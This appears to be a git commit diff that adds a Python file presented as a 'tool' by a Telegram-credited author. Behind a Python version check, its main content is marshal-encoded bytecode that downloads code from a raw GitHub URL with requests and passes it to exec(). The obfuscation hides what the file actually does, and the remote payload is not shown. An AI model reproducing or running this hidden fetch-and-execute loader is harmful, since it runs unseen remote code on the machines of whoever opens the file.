6e5e41cec9c2c0aed51550055fc3863e94bf5d70
ABOSS2008 <161223363+ABOSS2008@users.noreply.github.com>
2024-03-01 11:37:40 +0300

    Update هاي اداة عبوسي @A_B_A_S64 .txtED.py

--- هاي اداة عبوسي @A_B_A_S64 .txtED.py
+++ هاي اداة عبوسي @A_B_A_S64 .txtED.py
@@ -1,1 +1,25 @@
+ر
+__obfuscator__ = "ZAID" 
+
+__tele__ = "@A_B_A_S64" 
+
+__code__ = "TELE<@A_B_A_S64" 
+
+__authors__ = ("@A_B_A_S64", "@A_B_A_S64") 
+
+ 
+import sys
+Yasser = bytes([46]).decode().join(sys.version.split(bytes([32]).decode())[0].split(bytes([46]).decode())[:-1]) 
+if Yasser != bytes([51, 46, 57]).decode(): 
+ print(bytes([91, 33, 93, 32, 78, 111, 32, 115, 117, 112, 112, 111, 114, 116, 32, 102, 111, 114, 32, 91, 86, 65, 76, 85, 69, 93]).decode().replace(bytes([91, 86, 69, 82, 83, 73, 79, 78, 93]).decode(), sys.version.split(bytes([32]).decode())[0])) 
+ exit(0) 
+import marshal
+exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s(\x00\x00\x00d\x00d\x01l\x00Z\x00d\x02Z\x01e\x00\xa0\x02e\x01\xa1\x01Z\x03e\x03j\x04Z\x05e\x06e\x05\x83\x01\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Nug\x00\x00\x00https://raw.githubusercontent.com/ABOSS2008/IOVE/main/\xd9\x87\xd8\xa7\xd9\x8a \xd8\xa7\xd8\xaf\xd8\xa7\xd8\xa9 \xd8\xb9\xd8\xa8\xd9\x88\xd8\xb3\xd9\x8a %40A_B_A_S64 .txtED.py)\x07Z\x08requestsZ\x03url\xda\x03getZ\x08response\xda\x04text\xda\x04code\xda\x04exec\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x08\x02\x04\x02\n\x01\x06\x02'))
+ 
+
+__obfuscator__ = "@A_B_A_S64" 
+
+
+
+#تم التشفير بواسطه عبوسي @A_B_A_S64 
 
